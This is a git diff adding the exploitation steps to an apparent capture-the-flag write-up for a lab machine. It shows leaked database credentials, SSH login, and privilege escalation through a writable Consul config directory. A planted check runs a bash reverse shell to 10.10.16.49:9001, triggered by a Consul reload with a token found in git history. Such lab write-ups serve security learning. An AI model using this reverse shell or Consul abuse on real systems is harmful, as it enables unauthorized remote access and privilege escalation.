@@ -147,4 +147,114 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 ### Exploitation
 
-- 
+![img03](screenshots/img03.png)
+
+- From the public exploit we fetched some DB file and configs.
+
+**looking at the config files and database**:
+
+**Database**:
+
+![img04](screenshots/img04.png)
+
+- In the table **data_source** we found the user **Grafana** and it's password: **dontStandSoCloseToMe63221!** let's try logging 
+
+**Connecting to remote database:**
+
+```
+mysql -h 10.10.11.183 -u 'grafana' -p'dontStandSoCloseToMe63221!' -P 3306
+```
+
+![img05](screenshots/img05.png)
+
+**Inspecting the Database**
+
+- First we list out all of the databases,
+- then looked for the database where we can find something useful, like username and passwords.
+
+![img06](screenshots/img06.png)
+
+- We've inspected the Databases called: **whackywidget** and there in a table named **users** we found the login credentials for the user **developer**.
+
+- The password is encoded in **base64** so we'll have to decode it first!
+	- save the password hash in a text file, then:
+
+![img07](screenshots/img07.png)
+
+### Initial Foothold
+
+- Connecting to the target through **SSH**
+
+```
+ssh developer@10.10.11.183
+```
+
+- then enter the decoded password
+
+![img08](screenshots/img08.png)
+
+**Target Enumeration**
+
+- Listing the content of the user **developer** home directory we found a **.gitconfig** file, where we have found a location: **/opt/my-app**
+
+![img09](screenshots/img09.png)
+
+- Checking the contents in **/opt/my-app** we found a script: **put-config-in-consul.sh**, and by concatenating the script we found that a service **consul** might be running on the system.
+
+![img10](screenshots/img10.png)
+
+**Enumerating Consul**:
+
+- By googling we found that : *Consul uses service identities and traditional networking practices to help organizations securely connect applications running in any environment.*
+👉**[for more information](https://www.consul.io/)**👈
+
+- Also from our **linpeas.sh** enumeration, we found that a we have a **write permission** in the the directory **/etc/consul.d/config.d**.
+
+![img11](screenshots/img11.png)
+
+- So now that we know we have a write access to **consul configuration** directory, we can create a sample script to run our reverse shell command. And then we'll reload the consul service.
+
+**Writing a script**:
+
+- from the **consul.hcl** file at the very bottom we found that the **hcl** formatted data is manipulated here, so we can try to create a sample script using this as our reference:
+
+![img13](screenshots/img13.png)
+
+![img14](screenshots/img14.png)
+
+- Our Script:
+
+```
+check = {
+	id: "SampleID"
+	args: ["bash", "-c", "bash -i >& /dev/tcp/10.10.16.49/9001 0>&1"]
+	interval: 5s
+}
+```
+
+- and save it **samplescript.hcl** in the consul configuration directory.
+
+```
+vi /etc/consul.d/config.d/samplescript.hcl
+```
+
+- Reloading consul:
+
+![img15](screenshots/img15.png)
+
+- It's asking for some Token!
+
+- Checking in the /opt/my-app directory we found the token in the last git commit!
+
+![img16](screenshots/img16.png)
+
+- Setup a listener on your computer and then try it again with the token :
+
+```
+consul reload --token bb03b43b-1d81-d62b-24b5-39540ee469b5
+```
+
+![img17](screenshots/img17.png)
+
+**DONE**
+
